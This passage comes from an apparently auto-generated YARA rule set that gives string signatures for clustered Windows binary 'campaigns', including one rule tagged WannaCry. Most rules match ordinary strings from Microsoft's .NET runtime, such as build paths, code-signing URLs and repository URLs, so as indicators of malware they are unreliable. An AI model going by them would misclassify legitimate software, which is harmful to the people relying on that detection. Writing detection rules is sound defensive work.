        $s8 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s10 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/ma" ascii
        $s11 = "       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_c14d2520_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-c14d2520"
        date = "2026-10-31"
        campaign = "dotnet_typelib_guid-c14d2520"
        family = ""
        hash = "664d77cc2163f40e80ac0e1ee4ed84b3a5c21c580a277dd63fdd4e448e55a3f7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-c14d2520.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "<ExceptionToUnmanagedMarshaller>k__BackingField" ascii
        $s4 = "FType of managed object is not supported for marshalling as ComVariant." ascii
        $s5 = "get_ComVariantMarshaller_UnmanagedTypeNotSupported" ascii
        $s6 = "get_ComVariantMarshaller_ManagedTypeNotSupported" ascii
        $s7 = "OType of unmanaged variant is not supported for marshalling to a managed object." ascii
        $s8 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s9 = "Invalid combination of unmanaged variant type and managed object type." wide
        $s10 = "#Access to the path '{0}' is denied.r" ascii
        $s11 = "TryCreateOleVariantForInterfaceWrapper" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_374995b4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-374995b4"
        date = "2026-10-31"
        campaign = "dotnet_typelib_guid-374995b4"
        family = ""
        hash = "0860d7f619373d259bd682e7d10f07f2373ab56d333e9b56157e2a8c508509a2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-374995b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/Microsoft.VisualBasic.Core/Release/net10.0-windows/Microsoft.VisualBasi" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "     ue/falseshort daort datelong datong datelong timong timecurrencystandard" wide
        $s6 = " medium dium datemedium tium time        scientifientific     " wide
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "&2^<NEBNRXNaBj&t&x\"}2" ascii
        $s9 = "*2~<NEBN~XNaBj&t&x6" ascii
        $s10 = "  short tiort time    " wide
        $s11 = "&92@FHBP&TrcVpf" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2388592 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_8e5a9a68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-8e5a9a68"
        date = "2026-10-31"
        campaign = "dotnet_typelib_guid-8e5a9a68"
        family = ""
        hash = "206564eeafdf2c3a277fcd19938713f89c0e66f1f3cb3260c20d0a2042315833"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-8e5a9a68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<System_Transactions_DtcProxyShim_ResourceManagerNotifyShim>F506C319B94A04264D10902F7E1F34DF57AFEAC6" ascii
        $s1 = "<System_Transactions_DtcProxyShim_DtcInterfaces_ITmNodeName>F83A5FD8143BEEC85074C07122F0B8F7539C6988" ascii
        $s2 = "<System_Transactions_DtcProxyShim_DtcInterfaces_IResourceManager>FE897E5B6029CDA8583BCE2F387D4A8A97A" ascii
        $s3 = "<System_Transactions_DtcProxyShim_DtcInterfaces_IResourceManagerSink>F27BFCAE9FB4597E73042DFBBE3B6C9" ascii
        $s4 = "<System_Transactions_DtcProxyShim_DtcInterfaces_ITransaction>FB743A426B2DB07696CEF15ED76C59A3594F984" ascii
        $s5 = "<System_Transactions_DtcProxyShim_DtcInterfaces_IPrepareInfo>F2B331A3475953ED21DD6863BAC5587A8F19ADB" ascii
        $s6 = "<System_Transactions_DtcProxyShim_Phase0NotifyShim>FCAF6D6532B6DEAD97BAF81D6C20E91901C9925D7D5BEB7FC" ascii
        $s7 = "<System_Transactions_DtcProxyShim_EnlistmentNotifyShim>F47E6FA6FFD0D268549B3DCBFD7D41032D7F1ADAC633B" ascii
        $s8 = "<System_Transactions_DtcProxyShim_DtcInterfaces_ITransactionReceiver>FAB549EE1B28E423434D7E6997F235C" ascii
        $s9 = "<System_Transactions_DtcProxyShim_VoterNotifyShim>FA18C5EDCD51F4A664DC19CC0FA94E2E0E150CD525B2D4C7D4" ascii
        $s10 = "<System_Transactions_DtcProxyShim_DtcInterfaces_ITransactionImport>F136A2D433BF33251E76B0FFABABE4189" ascii
        $s11 = "<System_Transactions_DtcProxyShim_DtcInterfaces_ITransactionExport>FC6641784F50EFBA1BC5C5625F9FC78F6" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1282656 and 12 of them
}

rule Sightlines_imphash_41a58c3c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-41a58c3c"
        date = "2026-10-31"
        campaign = "imphash-41a58c3c"
        family = ""
        hash = "4e2109c88298f0a614aac82b23310b13835673a8e192a6a8b75c25459e591169"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-41a58c3c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Yhttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crl0w" ascii
        $s1 = "[http://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\coreclr\\windows.x64.Release\\dlls\\mscordac\\mscordaccore.pdb" ascii
        $s3 = "'Microsoft Windows Code Signing PCA 20240" ascii
        $s4 = "System.Threading.Thread.UseAllCpuGroups" wide
        $s5 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\vm\\typehandle.cpp" ascii
        $s6 = "CORINFO_HELP_GETDYNAMIC_NONGCTHREADSTATIC_BASE_NOCTOR_OPTIMIZED2" ascii
        $s7 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\vm\\method.cpp" ascii
        $s8 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\vm\\threads.cpp" ascii
        $s9 = "CORINFO_HELP_GETDYNAMIC_GCTHREADSTATIC_BASE_NOCTOR_OPTIMIZED" ascii
        $s10 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\daccess\\enummem.cpp" ascii
        $s11 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\vm\\peimage.cpp" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2713280 and 12 of them
}

rule Sightlines_imphash_24df5360_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-24df5360"
        date = "2026-10-31"
        campaign = "imphash-24df5360"
        family = ""
        hash = "0109e6b251ab56b80f6c02a51a92f03f44a9b1ad410f2cf3cf6b7dd6543139a9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-24df5360.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Yhttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crl0w" ascii
        $s1 = "[http://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "CSW::GFW - managed exception handling code frame (%p)" ascii
        $s3 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\coreclr\\windows.x64.Release\\dlls\\mscordbi\\mscordbi.pdb" ascii
        $s4 = "'Microsoft Windows Code Signing PCA 20240" ascii
        $s5 = "4-D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\rstype.cpp" ascii
        $s6 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\divalue.cpp" ascii
        $s7 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\hash.cpp" ascii
        $s8 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\rsthread.cpp" ascii
        $s9 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\rsmain.cpp" ascii
        $s10 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\rsregsetcommon.cpp" ascii
        $s11 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\debug\\di\\process.cpp" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2475776 and 12 of them
}

rule Sightlines_imphash_a540fec2_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a540fec2"
        date = "2026-11-01"
        campaign = "imphash-a540fec2"
        family = "wannacry"
        hash = "86b193b0614e1399b84e4ea81e35d07cd0a96e93be6a5c97354aafbab2c81d2e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a540fec2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10534918 and 12 of them
}

rule Sightlines_imphash_68bade73_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-68bade73"
        date = "2026-10-31"
        campaign = "imphash-68bade73"
        family = ""
        hash = "0749d8fc8e944d0576e1bb47120f87add8f875e5cd8968995633063fc79256f6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-68bade73.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\coreclr\\windows.x64.Release\\jit\\clrjit.pdb" ascii
        $s1 = "NYI: Don't call genPopRegs with real regs!" ascii
        $s2 = "NYI: Don't call genPushRegs with real regs!" ascii
        $s3 = "JitGuardedDevirtualizationMaxTypeChecks" ascii
        $s4 = "ConvertToSByteWithTruncatedSaturationAndZeroExtendToInt32" ascii
        $s5 = "ConvertToByteWithTruncatedSaturationAndZeroExtendToInt32" ascii
        $s6 = "ConvertToSByteWithSaturationAndZeroExtendToInt32" ascii
        $s7 = "ConvertToByteWithSaturationAndZeroExtendToInt32" ascii
        $s8 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\jit\\codegenxarch.cpp" ascii
        $s9 = "CORINFO_HELP_GETDYNAMIC_NONGCTHREADSTATIC_BASE_NOCTOR_OPTIMIZED2" ascii
        $s10 = "D:\\a\\_work\\1\\s\\src\\runtime\\src\\coreclr\\jit\\codegencommon.cpp" ascii
        $s11 = "JitObjectStackAllocationBoxedValueClass" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4408848 and 12 of them
}

rule Sightlines_imphash_80197eb0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-80197eb0"
        date = "2026-10-31"
        campaign = "imphash-80197eb0"
        family = ""
        hash = "4d174b78aa8b3516c7e3cec0355dfe9ae570894055c377d2e5565d077a9a7a1e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-80197eb0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\native\\net10.0-windows-Release-x64\\System.IO.Compression.Na" ascii
        $s1 = " deflate 1.3.1 Copyright 1995-2024 Jean-loup Gailly and Mark Adler " ascii
        $s2 = " inflate 1.3.1 Copyright 1995-2024 Mark Adler " ascii
        $s3 = "tive\\System.IO.Compression.Native.pdb" ascii
        $s4 = "BrotliEncoderDestroyPreparedDictionary" ascii
        $s5 = "BrotliEncoderAttachPreparedDictionary" ascii
        $s6 = "BrotliSharedDictionaryDestroyInstance" ascii
        $s7 = "_ERROR_FORMAT_SIMPLE_HUFFMAN_ALPHABET" ascii
        $s8 = "BrotliSharedDictionaryCreateInstance" ascii
        $s9 = "CompressionNative_InflateReset2_" ascii
        $s10 = "BrotliDecoderSetMetadataCallbacks" ascii
        $s11 = "_ERROR_FORMAT_EXUBERANT_META_NIBBLE" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1876512 and 12 of them
}

rule Sightlines_signer_cert_sha1_4eb24eef_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-4eb24eef"
        date = "2026-10-31"
        campaign = "signer_cert_sha1-4eb24eef"
        family = ""
        hash = "145ade963eba427027d5e1381db5d51a0ef9e98e9fef9efbfa6074ca20da246f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-4eb24eef.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260617182137Z0t1" ascii
        $s1 = "250619182137Z" ascii
        $s2 = "230012+5053590" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3632176 and 3 of them
}

rule Sightlines_tlsh_f537a571_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f537a571"
        date = "2026-10-31"
        campaign = "tlsh-f537a571"
        family = ""
        hash = "079cf4a6a2c9ec77b9e03f0222740f9eaf9f5e7359a16fbf3450ad7bc44de321"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f537a571.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.ComponentModel.Primitives/Release/net10.0/System.ComponentModel." ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "<WindowStyle>k__BackingField" ascii
        $s6 = "<Appearance>k__BackingField" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "<DragDrop>k__BackingField" ascii
        $s9 = "<Behavior>k__BackingField" ascii
        $s10 = "<Layout>k__BackingField" ascii
        $s11 = "InlineArrayAsReadOnlySpan" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_7dd42629_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7dd42629"
        date = "2026-10-31"
        campaign = "tlsh-7dd42629"
        family = ""
        hash = "0ad1db4be167f3c0ddc187a2a046f0ed83e70d5cf772550fecbdc82f650a9ee4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7dd42629.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Formats.Asn1/Release/net10.0/System.Formats.Asn1.pdb" ascii
        $s4 = "RProvides classes that can read and write the ASN.1 BER, CER, and DER data formats." ascii
        $s5 = "<ParseGeneralizedTime>g__GetNextState|43_0" ascii
        $s6 = "HThe AsnWriter cannot be written to while performing the Encode callback." ascii
        $s7 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s8 = "get_AsnWriter_ModifyingWhileEncoding" ascii
        $s9 = ".NETCoreApp,Version=v10.0" ascii
        $s10 = "InlineArrayAsReadOnlySpan" ascii
        $s11 = "<>y__InlineArray2`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_24d9bbf0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-24d9bbf0"
        date = "2026-10-31"
        campaign = "tlsh-24d9bbf0"
        family = ""
        hash = "10519351ed44c8519ef28fd57d7668bfb67f771905dd8216706cdcbc8abc93d0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-24d9bbf0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.ComponentModel.Annotations/Release/net10.0/System.ComponentModel" ascii
        $s4 = "3The value for property '{0}' must be of type '{1}'.{" ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = "to discover the type of the instance being validated in order to resolve the DisplayNameAttribute wh" ascii
        $s7 = "Constructing a ValidationContext without a display name is not trim-safe because it uses reflection " ascii
        $s8 = "Constructors that trigger this codepath are marked with RequiresUnreferencedCode. Constructor that t" ascii
        $s9 = "akes the display name as an argument is trim-safe." ascii
        $s10 = "en a display name is not provided." ascii
        $s11 = ".NETCoreApp,Version=v10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f6eb7540_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f6eb7540"
        date = "2026-10-31"
        campaign = "tlsh-f6eb7540"
        family = ""
        hash = "1222dcfa31f149796cc0bdc73004e29e3b57dd7eaa11133e5e214eac606bfc9a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f6eb7540.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Net.WebClient/Release/net10.0/System.Net.WebClient.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "%The message length limit was exceededT" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "IsAotCompatible" ascii
        $s8 = "value=\"false\">" ascii
        $s9 = ",F86@vR:Zj" ascii
        $s10 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_3b358f25_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3b358f25"
        date = "2026-10-31"
        campaign = "tlsh-3b358f25"
        family = ""
        hash = "127361ac77186c2322e2fa5d75aac441c25eab9bd28ccb7799dfc0b06897db59"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3b358f25.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "&%'%(%)%*%+%,%.-32425298:8;8<8=8?>BACADAEAFAIHQPWV[Z\\Z^]_^`^a]b]ihkjrqsqtquqvqwqxqyqzq{q|q}q~q" wide
        $s1 = "bSystem.Net.Http.HttpConnection+<<CheckUsabilityOnScavenge>g__ReadAheadWithZeroByteReadAsync|39_0>d" ascii
        $s2 = "OSystem.Net.Http.Http3Connection+<>c__DisplayClass32_0+<<CheckForShutdown>b__0>d" ascii
        $s3 = "QSystem.Net.Http.HttpConnection+<CopyToUntilEofWithExistingBufferedDataAsync>d__92" ascii
        $s4 = "XSystem.Net.Http.HttpConnection+<<FillForHeadersAsync>g__ReadUntilEndOfHeaderAsync|83_0>d" ascii
        $s5 = "uSystem.Net.Http.Http3Connection+<>c__DisplayClass47_0+<<ProcessServerControlStreamAsync>g__ReadFram" ascii
        $s6 = "MSystem.Net.Http.HttpConnection+<<WriteAsync>g__AwaitFlushAndWriteAsync|71_0>d" ascii
        $s7 = "<CheckUsabilityOnScavenge>g__TransitionToCompletedAndTryOwnCompletion|39_1" ascii
        $s8 = "ASystem.Net.Http.Http3RequestStream+<SkipUnknownPayloadAsync>d__57" ascii
        $s9 = "vSystem.Net.Http.Http3Connection+<>c__DisplayClass47_0+<<ProcessServerControlStreamAsync>g__SkipUnkn" ascii
        $s10 = "ISystem.Net.Http.HttpConnection+<FlushThenWriteWithoutBufferingAsync>d__74" ascii
        $s11 = "CSystem.Net.Http.HttpConnectionPool+<EstablishProxyTunnelAsync>d__57" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3494512 and 12 of them
}

rule Sightlines_tlsh_70c8eede_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-70c8eede"
        date = "2026-10-31"
        campaign = "tlsh-70c8eede"
        family = ""
        hash = "14ed0e4a1832a085eb655a6725f2dc841b53a08396979609f0814578896857d7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-70c8eede.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Xml.ReaderWriter/Release/net10.0/System.Xml.ReaderWriter.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "IsAotCompatible" ascii
        $s4 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_5b2d5f51_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b2d5f51"
        date = "2026-10-31"
        campaign = "tlsh-5b2d5f51"
        family = ""
        hash = "17e157aacc2c749ea27ef5cd6668ba270e5438587013e77d9c87837d9659914a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b2d5f51.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Linq.Queryable/Release/net10.0/System.Linq.Queryable.pdb" ascii
        $s4 = "wThe Queryable MinBy and MaxBy taking an IComparer<TSource> are obsolete. Use the new ones that take" ascii
        $s5 = "KThere is no method '{0}' on type '{1}' that matches the specified argumentsW" ascii
        $s6 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s7 = "OverloadResolutionPriorityAttribute" ascii
        $s8 = ".NETCoreApp,Version=v10.0" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = " an IComparer<TKey>." ascii
        $s11 = "\"*(F0F8F@BHNP&S*Yfh" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9008fdae_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9008fdae"
        date = "2026-10-31"
        campaign = "tlsh-9008fdae"
        family = ""
        hash = "128aee8c62a673d64739e585e3876b61133571cec83a46240a62581d5465639b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9008fdae.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "wnObject\":[344,\"GCHandle\"],\"LinkNext\":[120,\"pointer\"],\"ThreadLocalDataPtr\":592,\"TEB\":48},\"ThreadStor" ascii
        $s1 = "g\":64,\"_remoteStackTraceString\":72,\"_HResult\":108,\"_xcode\":104},\"ExceptionInfo\":{\"ThrownObject\":8,\"P" ascii
        $s2 = "TAStackCrawlCallBack: STACKCRAWL method:%pM ('%s'), offset %x, Frame:%p, FrameIdentifier = %s" ascii
        $s3 = "oken\":40},\"FnPtrTypeDesc\":{\"NumArgs\":24,\"CallConv\":28,\"RetAndArgTypes\":32,\"LoaderModule\":16},\"Dynami" ascii
        $s4 = "ReadyToRunInfo\":608,\"GrowableSymbolStream\":336,\"AvailableTypeParams\":528,\"InstMethodHashTable\":584,\"" ascii
        $s5 = "reviousNestedInfo\":0},\"GCHandle\":{\"!\":8},\"Object\":{\"m_pMethTab\":0},\"String\":{\"m_FirstChar\":12,\"m_Str" ascii
        $s6 = "onNode\":{\"VersionId\":16,\"Next\":24,\"RejitState\":32},\"ProfControlBlock\":{\"GlobalEventMask\":1888},\"Fram" ascii
        $s7 = "gException\":1350},\"ResumableFrame\":{\"!\":24,\"TargetContextPtr\":16},\"HijackFrame\":{\"!\":40,\"ReturnAddre" ascii
        $s8 = "t\":1768,\"HighFrequencyHeap\":696,\"LowFrequencyHeap\":688,\"StubHeap\":712},\"PEAssembly\":{\"PEImage\":8,\"As" ascii
        $s9 = "robeExtensionResult\":40},\"PEImageLayout\":{\"Base\":8,\"Size\":16,\"Flags\":20},\"CGrowableSymbolStream\":{\"B" ascii
        $s10 = "layLoadMethodCallThunks\":112,\"EntryPointToMethodDescMap\":336},\"ReadyToRunHeader\":{\"MajorVersion\":4,\"" ascii
        $s11 = "s\":0},\"EEClass\":{\"MethodTable\":16,\"MethodDescChunk\":32,\"NumMethods\":68,\"FieldDescList\":24,\"CorTypeAt" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9475600 and 12 of them
}

rule Sightlines_tlsh_3657c2c7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3657c2c7"
        date = "2026-10-31"
        campaign = "tlsh-3657c2c7"
        family = ""
        hash = "1b19d86241bb7a033f30946d4556440258d2d88793a26465bccced7d2b44b93c"
